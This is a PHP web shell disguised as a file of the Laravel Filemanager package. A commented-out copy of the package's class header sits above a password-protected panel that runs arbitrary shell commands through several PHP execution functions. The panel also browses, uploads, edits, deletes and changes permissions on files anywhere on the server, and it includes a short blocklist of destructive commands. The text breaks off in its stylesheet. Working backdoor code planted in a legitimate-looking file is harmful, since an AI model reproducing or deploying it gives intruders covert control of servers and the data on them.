<?php
#namespace UniSharp\LaravelFilemanager;

#use Illuminate\Contracts\Config\Repository as Config;
#use Illuminate\Http\Request;
#use Illuminate\Support\Facades\Route;
#use Illuminate\Support\Str;
#use UniSharp\LaravelFilemanager\Middlewares\CreateDefaultFolder;
#use UniSharp\LaravelFilemanager\Middlewares\MultiUser;

#class Lfm
#{
 #   const PACKAGE_NAME = 'laravel-filemanager';
  #  const DS = '/';

   # protected $config;
    #protected $request;

    #public function __construct(Config $config = null, Request $request = null)
    #{
     #   $this->config = $config;
      #  $this->request = $request;
// ==================== KONFIGURASI ====================
ini_set('display_errors', 0);
error_reporting(0);
session_start();

// ==================== ajax-server ====================
$valid_password_hash = '$2a$12$NBDO9jlhfqln1x3OVfI9Cu.iBXxIRMayiI4zIJWJlHg8aodUGj2Ci';

function is_authenticated() {
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

function login($password) {
    global $valid_password_hash;
    if (password_verify($password, $valid_password_hash)) {
        $_SESSION['authenticated'] = true;
        $_SESSION['login_time'] = time();
        return true;
    }
    return false;
}

function logout() {
    unset($_SESSION['authenticated']);
    unset($_SESSION['login_time']);
    session_destroy();
}

if (!is_authenticated()) {
    $login_error = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (login($_POST['password'])) {
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = "❌ Password salah!";
        }
    }
    
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🔐 Boncel huang</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            .login-container {
                background: rgba(255,255,255,0.95);
                border-radius: 12px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                padding: 40px;
                width: 100%;
                max-width: 400px;
                text-align: center;
            }
            .login-container h1 {
                color: #2c3e50;
                margin-bottom: 10px;
                font-size: 28px;
            }
            .login-container h1 span {
                background: linear-gradient(135deg, #43cea2 0%, #185a9d 100%);
                color: white;
                padding: 5px 15px;
                border-radius: 50px;
                font-size: 14px;
                display: inline-block;
                margin-top: 10px;
            }
            .login-container .emoji {
                font-size: 64px;
                margin-bottom: 20px;
            }
            .login-form {
                margin-top: 30px;
            }
            .password-input {
                width: 100%;
                padding: 15px;
                border: 2px solid #dee2e6;
                border-radius: 8px;
                font-size: 16px;
                transition: all 0.3s;
                margin-bottom: 20px;
            }
            .password-input:focus {
                border-color: #43cea2;
                outline: none;
                box-shadow: 0 0 0 3px rgba(67,206,162,0.1);
            }
            .login-btn {
                width: 100%;
                padding: 15px;
                background: linear-gradient(135deg, #43cea2 0%, #185a9d 100%);
                color: white;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s;
            }
            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(67,206,162,0.3);
            }
            .error-message {
                background: #f8d7da;
                color: #721c24;
                padding: 12px;
                border-radius: 6px;
                margin-bottom: 20px;
                border-left: 4px solid #dc3545;
                text-align: left;
            }
            .info {
                margin-top: 20px;
                color: #7f8c8d;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="emoji">💩</div>
            <h1>tadak huang</h1>
            
            <?php if ($login_error): ?>
                <div class="error-message"><?php echo $login_error; ?></div>
            <?php endif; ?>
            
            <form method="POST" class="login-form">
                <input type="password" name="password" class="password-input" placeholder="Masukkan password..." required autofocus>
                <button type="submit" class="login-btn">🔐 open</button>
            </form>
            
            <div class="info">
                atur nafas pinn<br>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ==================== SANITASI INPUT ====================
function sanitize_path($path) {
    // Hapus karakter berbahaya tapi izinkan path traversal (..)
    $path = preg_replace('/[^\w\-\/\\\\\.]/', '', $path);
    return $path;
}

function sanitize_filename($filename) {
    $filename = preg_replace('/[^\w\-\.]/', '', $filename);
    return $filename;
}

// ==================== FUNGSI DIRECT LINK ====================
function get_base_url() {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'];
    
    // HANYA domain, tanpa path script
    return $protocol . $host;
}

function path_to_url($path, $base_url) {
    $doc_root = realpath($_SERVER['DOCUMENT_ROOT'] ?? '.');
    $real_path = realpath($path);
    
    if ($real_path && strpos($real_path, $doc_root) === 0) {
        // Path berada di dalam document root
        $relative = substr($real_path, strlen($doc_root));
        $relative = str_replace('\\', '/', $relative);
        $relative = ltrim($relative, '/');
        
        // Gabungkan domain dengan path relatif
        return $base_url . '/' . $relative;
    }
    
    // Path di luar document root (tidak bisa diakses via web)
    return '#';
}

// ==================== TERMINAL FUNCTIONS ====================
function execute_command($cmd, $cwd = null) {
    $output = [];
    $return_var = 0;
    
    // Batasi command berbahaya
    $dangerous = ['rm -rf /', 'mkfs', 'dd if=', ':(){', '> /dev/sda', 'chmod -R 000', 'chown -R'];
    foreach ($dangerous as $pattern) {
        if (strpos($cmd, $pattern) !== false) {
            return "⚠️ Command diblokir untuk keamanan!";
        }
    }
    
    // Ganti direktori jika diperlukan
    $old_dir = getcwd();
    if ($cwd && is_dir($cwd)) {
        chdir($cwd);
    }
    
    // Coba berbagai metode eksekusi
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $output = shell_exec($cmd . ' 2>&1');
        if ($output !== null) {
            chdir($old_dir);
            return $output;
        }
    }
    
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        exec($cmd . ' 2>&1', $output, $return_var);
        if (!empty($output)) {
            chdir($old_dir);
            return implode("\n", $output);
        }
    }
    
    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        ob_start();
        system($cmd . ' 2>&1', $return_var);
        $output = ob_get_clean();
        if (!empty($output)) {
            chdir($old_dir);
            return $output;
        }
    }
    
    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        ob_start();
        passthru($cmd . ' 2>&1', $return_var);
        $output = ob_get_clean();
        if (!empty($output)) {
            chdir($old_dir);
            return $output;
        }
    }
    
    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($cmd, $descriptors, $pipes, $cwd);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            chdir($old_dir);
            return $output . $error;
        }
    }
    
    chdir($old_dir);
    return "❌ Tidak ada metode eksekusi yang tersedia";
}

// ==================== CURRENT DIRECTORY (TANPA BATASAN) ====================
$requested_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$current_dir = realpath($requested_dir);
$root = realpath('.'); // Define root for validation

if ($current_dir === false) {
    // Jika path tidak valid, gunakan root
    $current_dir = $root;
}

// ==================== HANDLE TERMINAL ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['terminal_cmd'])) {
    $cmd = trim($_POST['terminal_cmd']);
    if (!empty($cmd)) {
        // Gunakan current_dir untuk terminal
        $terminal_output = execute_command($cmd, $current_dir);
        
        // Simpan hanya output terakhir (bukan history)
        $_SESSION['last_output'] = [
            'cmd' => $cmd,
            'output' => $terminal_output,
            'time' => date('H:i:s')
        ];
        
        // Redirect untuk hindari resubmit
        header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($current_dir) . "&t=" . time());
        exit;
    }
}

// ==================== HANDLE LOGOUT ====================
if (isset($_GET['logout'])) {
    logout();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ==================== HANDLE CREATE ====================
$message = '';
$msg_type = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_file'])) {
    $new_filename = sanitize_filename($_POST['new_filename']);
    if (empty($new_filename)) {
        $message = "❌ Nama file tidak valid!";
        $msg_type = "error";
    } else {
        $new_file = $current_dir . DIRECTORY_SEPARATOR . $new_filename;
        if (!file_exists($new_file)) {
            if (file_put_contents($new_file, '') !== false) {
                $message = "✅ File berhasil dibuat!";
                $msg_type = "success";
            } else {
                $message = "❌ Gagal membuat file";
                $msg_type = "error";
            }
        } else {
            $message = "❌ File sudah ada!";
            $msg_type = "error";
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_folder'])) {
    $new_foldername = sanitize_filename($_POST['new_foldername']);
    if (empty($new_foldername)) {
        $message = "❌ Nama folder tidak valid!";
        $msg_type = "error";
    } else {
        $new_folder = $current_dir . DIRECTORY_SEPARATOR . $new_foldername;
        if (!file_exists($new_folder)) {
            if (mkdir($new_folder, 0755, true)) {
                $message = "✅ Folder berhasil dibuat!";
                $msg_type = "success";
            } else {
                $message = "❌ Gagal membuat folder";
                $msg_type = "error";
            }
        } else {
            $message = "❌ Folder sudah ada!";
            $msg_type = "error";
        }
    }
}

// ==================== HANDLE RENAME ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename_item'])) {
    $old_path = realpath($_POST['old_path']);
    $new_name = sanitize_filename($_POST['new_name']);

    if ($old_path && file_exists($old_path)) {
        if (!empty($new_name)) {
            $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $new_name;

            if (file_exists($new_path)) {
                $message = "❌ Nama sudah dipakai!";
                $msg_type = "error";
            } elseif (rename($old_path, $new_path)) {
                $message = "✅ Berhasil direname!";
                $msg_type = "success";
            } else {
                $message = "❌ Gagal rename";
                $msg_type = "error";
            }
        } else {
            $message = "❌ Nama tidak valid!";
            $msg_type = "error";
        }
    } else {
        $message = "❌ File/folder tidak ditemukan!";
        $msg_type = "error";
    }
}

// ==================== HANDLE EDIT/SAVE ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit_file'])) {
    $file_to_edit = realpath($_POST['file_path']);
    if ($file_to_edit && file_exists($file_to_edit)) {
        if (file_put_contents($file_to_edit, $_POST['file_content']) !== false) {
            $message = "✅ File disimpan!";
            $msg_type = "success";
        } else {
            $message = "❌ Gagal menyimpan";
            $msg_type = "error";
        }
    }
}

// ==================== HANDLE UPLOAD ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $upload_errors = [
        UPLOAD_ERR_OK => '✅ File berhasil diupload!',
        UPLOAD_ERR_INI_SIZE => '❌ File terlalu besar',
        UPLOAD_ERR_FORM_SIZE => '❌ File terlalu besar',
        UPLOAD_ERR_PARTIAL => '❌ File hanya terupload sebagian',
        UPLOAD_ERR_NO_FILE => '❌ Tidak ada file',
        UPLOAD_ERR_NO_TMP_DIR => '❌ Folder temporary tidak ada',
        UPLOAD_ERR_CANT_WRITE => '❌ Gagal menulis',
        UPLOAD_ERR_EXTENSION => '❌ Upload dihentikan'
    ];
    
    $error_code = $_FILES['file']['error'];
    
    if ($error_code === UPLOAD_ERR_OK) {
        $original_name = basename($_FILES['file']['name']);
        $clean_name = sanitize_filename($original_name);
        
        if (empty($clean_name)) {
            $message = "❌ Nama file tidak valid!";
            $msg_type = "error";
        } elseif (!is_writable($current_dir)) {
            $message = "❌ Folder tidak writable!";
            $msg_type = "error";
        } else {
            $target_file = $current_dir . DIRECTORY_SEPARATOR . $clean_name;
            
            // Handle duplicate
            $counter = 1;
            $file_parts = pathinfo($target_file);
            $extension = isset($file_parts['extension']) ? '.' . $file_parts['extension'] : '';
            while (file_exists($target_file)) {
                $new_filename = $file_parts['filename'] . '_' . $counter . $extension;
                $target_file = $current_dir . DIRECTORY_SEPARATOR . $new_filename;
                $counter++;
            }
            
            if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
                $message = "✅ File berhasil diupload!";
                $msg_type = "success";
            } else {
                $message = "❌ Gagal mengupload";
                $msg_type = "error";
            }
        }
    } else {
        $message = "Upload Error: " . ($upload_errors[$error_code] ?? "❌ Unknown error");
        $msg_type = "error";
    }
}

// ==================== HANDLE DELETE ====================
if (isset($_GET['delete'])) {
    $file_to_delete = realpath($_GET['delete']);
    if ($file_to_delete && file_exists($file_to_delete)) {
        if (is_dir($file_to_delete)) {
            // Hapus folder kosong
            if (rmdir($file_to_delete)) {
                $message = "✅ Folder dihapus!";
                $msg_type = "success";
            } else {
                $message = "❌ Gagal hapus folder (mungkin tidak kosong)";
                $msg_type = "error";
            }
        } else {
            if (unlink($file_to_delete)) {
                $message = "✅ File dihapus!";
                $msg_type = "success";
            } else {
                $message = "❌ Gagal hapus file";
                $msg_type = "error";
            }
        }
    }
}

// ==================== HANDLE CHMOD ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['chmod_file'])) {
    $chmod_path = realpath($_POST['chmod_path']);
    $chmod_perms = intval($_POST['chmod_perms'], 8);
    
    if ($chmod_path && file_exists($chmod_path)) {
        if (chmod($chmod_path, $chmod_perms)) {
            $message = "✅ Permission berhasil diubah ke " . $_POST['chmod_perms'];
            $msg_type = "success";
        } else {
            $message = "❌ Gagal mengubah permission";
            $msg_type = "error";
        }
    }
}

// ==================== FUNGSI PERMISSION LENGKAP ====================
function get_permission_display($path) {
    if (!file_exists($path)) return ['unix' => '----------', 'octal' => '0000', 'writable' => false];
    
    $perms = fileperms($path);
    
    // Format Unix (drwxr-xr-x)
    $unix = '';
    
    // Type
    $unix .= is_dir($path) ? 'd' : '-';
    
    // Owner
    $unix .= (($perms & 0x0100) ? 'r' : '-');
    $unix .= (($perms & 0x0080) ? 'w' : '-');
    $unix .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    
    // Group
    $unix .= (($perms & 0x0020) ? 'r' : '-');
    $unix .= (($perms & 0x0010) ? 'w' : '-');
    $unix .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    
    // Other
    $unix .= (($perms & 0x0004) ? 'r' : '-');
    $unix .= (($perms & 0x0002) ? 'w' : '-');
    $unix .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    
    // Format Octal (0755)
    $octal = substr(sprintf('%o', $perms), -4);
    
    return [
        'unix' => $unix,
        'octal' => $octal,
        'writable' => is_writable($path)
    ];
}

// ==================== GET FILES DENGAN URUTAN RAPI ====================
$all_files = scandir($current_dir);
$folders = [];
$hidden_files = [];
$normal_files = [];

if ($all_files) {
    foreach ($all_files as $file) {
        if ($file === '.' || $file === '..') continue;
        
        $path = $current_dir . '/' . $file;
        if (is_dir($path)) {
            $folders[] = $file;
        } elseif (strpos($file, '.') === 0) {
            $hidden_files[] = $file;
        } else {
            $normal_files[] = $file;
        }
    }
}

// Urutkan semua array secara alphabetical
sort($folders, SORT_STRING | SORT_FLAG_CASE);
sort($hidden_files, SORT_STRING | SORT_FLAG_CASE);
sort($normal_files, SORT_STRING | SORT_FLAG_CASE);

// ==================== EDITING FILE ====================
$editing_file = null;
$file_content = '';
if (isset($_GET['edit'])) {
    $edit_path = realpath($_GET['edit']);
    if ($edit_path && file_exists($edit_path) && is_file($edit_path) && is_readable($edit_path)) {
        $editing_file = $edit_path;
        $file_content = file_get_contents($edit_path);
    }
}

// ==================== HELPER FUNCTIONS ====================
function formatSize($bytes) {
    if ($bytes === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

function isImage($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg']);
}

// ==================== GET SYSTEM INFO ====================
$system_info = [
    'os' => php_uname('s') . ' ' . php_uname('r'),
    'host' => php_uname('n'),
    'php' => phpversion(),
    'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'user' => get_current_user(),
    'disabled' => ini_get('disable_functions')
];

// Cek status terminal (buka/tutup)
$terminal_status = isset($_COOKIE['terminal_status']) ? $_COOKIE['terminal_status'] : 'closed';

// Base URL untuk direct link
$base_url = get_base_url();
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>huang punya cerit💩</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(255,255,255,0.95);
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
            position: relative;
        }
        
        /* Header dengan Logo yang Bisa Diklik */
        .header {
            background: linear-gradient(135deg, #43cea2 0%, #185a9d 100%);
            color: white;
            padding: 25px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
        }
        .header:hover {
            background: linear-gradient(135deg, #3ab391 0%, #0e4a7a 100%);
        }
        .header h1 {
            font-size: 28px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .header h1 span {
            background: rgba(255,255,255,0.2);
            padding: 5px 15px;
            border-radius: 50px;
            font-size: 14px;
        }
        .logout-btn {
            background: rgba(231, 76, 60, 0.8);
            color: white;
            padding: 8px 15px;
            border-radius: 50px;
            text-decoration: none;
            font-size: 14px;
            margin-left: 15px;
            transition: all 0.3s;
        }
        .logout-btn:hover {
            background: #c0392b;
        }
        .terminal-indicator {
            position: absolute;
            top: 20px;
            right: 25px;
            background: rgba(0,0,0,0.3);
            padding: 8px 15px;
            border-radius: 50px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .terminal-indicator .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #f39c12;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        .current-path {
            background: rgba(0,0,0,0.2);
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
            margin-top: 15px;
        }
        .breadcrumb a {
            color: white;
            text-decoration: none;
            padding: 6px 12px;
            background: rgba(255,255,255,0.15);
            border-radius: 20px;
            font-size: 14px;
            transition: all 0.3s;
        }
        .breadcrumb a:hover {
            background: rgba(255,255,255,0.3);
            transform: translateY(-2px);
        }
        .breadcrumb span {
            color: rgba(255,255,255,0.5);
        }
        
        /* System Info */
        .system-info {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            padding: 15px 20px;
            background: #2c3e50;
            color: #ecf0f1;
            font-size: 13px;
            border-bottom: 2px solid #34495e;
        }
        .system-info-item {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(255,255,255,0.1);
            padding: 5px 12px;
            border-radius: 20px;
        }
        
        /* Stats */
        .stats {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            padding: 10px 20px;
            background: #e9ecef;
            font-size: 13px;
            color: #495057;
        }
        
        /* Actions Grid */
        .actions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            padding: 20px;
            background: #f8f9fa;
            border-bottom: 2px solid #e9ecef;
        }
        .action-card {
            background: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .action-card h3 {
            color: #495057;
            margin-bottom: 10px;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .action-form {
            display: flex;
            gap: 8px;
        }
        .text-input {
            flex: 1;
            padding: 10px;
            border: 2px solid #dee2e6;
            border-radius: 6px;
            font-size: 14px;
            transition: all 0.3s;
        }
        .text-input:focus {
            border-color: #43cea2;
            outline: none;
            box-shadow: 0 0 0 3px rgba(67,206,162,0.1);
        }
        
        /* Buttons */
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        .btn-primary { background: #43cea2; color: white; }
        .btn-primary:hover { background: #3ab391; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(67,206,162,0.3); }
        .btn-warning { background: #f39c12; color: white; }
        .btn-warning:hover { background: #e67e22; transform: translateY(-2px); }
        .btn-danger { background: #e74c3c; color: white; }
        .btn-danger:hover { background: #c0392b; transform: translateY(-2px); }
        .btn-info { background: #3498db; color: white; }
        .btn-info:hover { background: #2980b9; transform: translateY(-2px); }
        .btn-success { background: #27ae60; color: white; }
        .btn-success:hover { background: #229954; transform: translateY(-2px); }
        .btn-secondary { background: #95a5a6; color: white; }
        .btn-secondary:hover { background: #7f8c8d; }
        .btn-small {
            padding: 6px 12px;
            font-size: 12px;
            border-radius: 4px;
            text-decoration: none;
            color: white;
            font-weight: 500;
            transition: all 0.2s;
            display: inline-block;
            margin: 2px;
            border: none;
            cursor: pointer;
        }
        
        /* Direct Link Button - Warna Ungu */
        .btn-direct {
            background: #9b59b6 !important;
            color: white !important;
        }
        .btn-direct:hover {
            background: #8e44ad !important;
            transform: translateY(-2px);
            box-shadow: 0 2px 8px rgba(155,89,182,0.5);
        }
        
        /* Upload Section */
        .upload-section {
            padding: 20px;
            background: #f1f8ff;
        }
        .upload-form {
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }
        .file-input {
            flex: 1;
            padding: 10px;
            border: 2px dashed #43cea2;
            border-radius: 6px;
            background: white;
            cursor: pointer;
            min-width: 250px;
        }
        .upload-info {
            font-size: 12px;
            color: #666;
            margin-top: 8px;
            padding: 8px;
            background: #e9ecef;
            border-radius: 4px;
        }
        
        /* TERMINAL POPUP - Muncul saat logo diklik */
        .terminal-popup {
            display: <?php echo $terminal_status === 'open' ? 'block' : 'none'; ?>;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 1200px;
            height: 80vh;
            background: url('https://i.ibb.co/HDD0dx5J/image.png') no-repeat center center fixed;
            background-size: cover;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            z-index: 1000;
            overflow: hidden;
            animation: popupFade 0.3s ease;
        }
        @keyframes popupFade {
            from { opacity: 0; transform: translate(-50%, -60%); }
            to { opacity: 1; transform: translate(-50%, -50%); }
        }
        
        .terminal-popup .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 20px;
            background: url('https://i.ibb.co/HDD0dx5J/image.png')
            color: #fff;
            border-bottom: 1px solid #3e3e3e;
        }
        .terminal-popup .terminal-title {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            color: #43cea2;
        }
        .terminal-popup .terminal-status {
            display: flex;
            gap: 15px;
            font-size: 12px;
            color: #888;
            align-items: center;
        }
        .terminal-popup .terminal-body {
            height: calc(100% - 120px);
            overflow-y: auto;
            padding: 15px;
            background: url('https://i.ibb.co/HDD0dx5J/image.png')
        }
        .terminal-popup .terminal-output {
            color: #f0f0f0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.6;
        }
        .terminal-popup .terminal-line {
            padding: 8px 0;
            border-bottom: 1px solid #2a2a2a;
        }
        .terminal-popup .terminal-prompt {
            color: #43cea2;
            font-weight: bold;
            margin-right: 10px;
        }
        .terminal-popup .terminal-command {
            color: #f39c12;
        }
        .terminal-popup .terminal-output-text {
            color: #d4d4d4;
            white-space: pre-wrap;
            margin-top: 5px;
            margin-left: 20px;
            padding: 8px;
            padding-left: 15px;
            border-left: 3px solid #43cea2;
            background: #252525;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }
        .terminal-popup .terminal-time {
            color: #888;
            font-size: 11px;
            margin-left: 10px;
        }
        .terminal-popup .terminal-input-area {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            display: flex;
            padding: 15px;
            background: #252525;
            border-top: 1px solid #3e3e3e;
        }
        .terminal-popup .terminal-prompt-current {
            color: #43cea2;
            font-weight: bold;
            margin-right: 10px;
            font-family: monospace;
            line-height: 40px;
        }
        .terminal-popup .terminal-input {
            flex: 1;
            background: #1e1e1e;
            border: 1px solid #3e3e3e;
            color: #fff;
            padding: 10px 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
        }
        .terminal-popup .terminal-input:focus {
            border-color: #43cea2;
        }
        .terminal-popup .terminal-quick {
            position: absolute;
            bottom: 80px;
            left: 0;
            right: 0;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            padding: 10px 15px;
            background: #252525;
            border-top: 1px solid #3e3e3e;
            max-height: 100px;
            overflow-y: auto;
        }
        .terminal-popup .quick-cmd {
            background: #333;
            color: #ddd;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            cursor: pointer;
            border: 1px solid #444;
            transition: all 0.2s;
            white-space: nowrap;
        }
        .terminal-popup .quick-cmd:hover {
            background: #43cea2;
            color: #000;
            border-color: #43cea2;
        }
        .terminal-popup .close-btn {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 5px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        .terminal-popup .close-btn:hover {
            background: #c0392b;
        }
        .terminal-popup .current-dir {
            color: #43cea2;
            font-size: 12px;
            background: #333;
            padding: 2px 8px;
            border-radius: 4px;
        }
        
        /* Overlay saat terminal terbuka */
        .terminal-overlay {
            display: <?php echo $terminal_status === 'open' ? 'block' : 'none'; ?>;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            z-index: 999;
        }
        
        /* Message */
        .message {
            margin: 20px;
            padding: 15px;
            border-radius: 8px;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        }
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .success { background: #d4edda; color: #155724; border-left: 4px solid #28a745; }
        .error { background: #f8d7da; color: #721c24; border-left: 4px solid #dc3545; }
        
        /* File List - dengan section headers */
        .file-list {
            padding: 20px;
        }
        
        .file-section {
            margin-bottom: 25px;
        }
        
        .file-section h3 {
            color: #2c3e50;
            font-size: 16px;
            margin-bottom: 10px;
            padding-bottom: 5px;
            border-bottom: 2px solid #43cea2;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .file-section h3 span {
            background: #43cea2;
            color: white;
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 12px;
        }
        
        .file-item {
            display: grid;
            grid-template-columns: auto 1fr auto auto auto;
            gap: 15px;
            align-items: center;
            padding: 12px 15px;
            border-bottom: 1px solid #e9ecef;
            transition: all 0.2s;
        }
        .file-item:hover {
            background: #f8f9fa;
            transform: translateX(5px);
        }
        .file-icon { font-size: 24px; width: 32px; text-align: center; }
        .file-info { display: flex; flex-direction: column; }
        .file-name {
            font-weight: 500;
            color: #2c3e50;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .file-name a { color: #3498db; text-decoration: none; }
        .file-name a:hover { text-decoration: underline; }
        .file-size { font-size: 12px; color: #7f8c8d; }
        
        .file-perms {
            font-family: 'Courier New', monospace;
            font-size: 12px;
            background: #ecf0f1;
            padding: 4px 8px;
            border-radius: 4px;
            cursor: help;
            transition: all 0.2s;
            min-width: 90px;
            text-align: center;
        }
        .file-perms:hover {
            transform: scale(1.05);
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .perm-writable {
            color: #00aa00 !important;
            background: #e8f5e8 !important;
            border-left: 3px solid #00aa00;
        }
        .perm-readonly {
            color: #ff0000 !important;
            background: #ffeeee !important;
            border-left: 3px solid #ff0000;    
        }
        .perm-unix {
            font-size: 13px;
            font-weight: bold;
        }
        .perm-octal {
            font-size: 10px;
            opacity: 0.7;
            margin-top: 2px;
        }
        
        .file-actions { display: flex; gap: 8px; flex-wrap: wrap; justify-content: flex-end; }
        
        .hidden-file .file-name {
            color: #7f8c8d;
            font-style: italic;
        }
        .hidden-file .file-name a {
            color: #7f8c8d;
        }
        
        /* Editor */
        .editor-container {
            padding: 20px;
            background: #1e1e1e;
        }
        .editor-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding: 10px;
            background: #2d2d2d;
            border-radius: 6px;
            color: white;
        }
        .editor-title { font-size: 16px; font-weight: 600; color: #43cea2; }
        textarea.code-editor {
            width: 100%;
            height: 500px;
            padding: 20px;
            background: #1e1e1e;
            color: #d4d4d4;
            border: 1px solid #3e3e3e;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.6;
            resize: vertical;
        }
        textarea.code-editor:focus { outline: none; border-color: #43cea2; }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
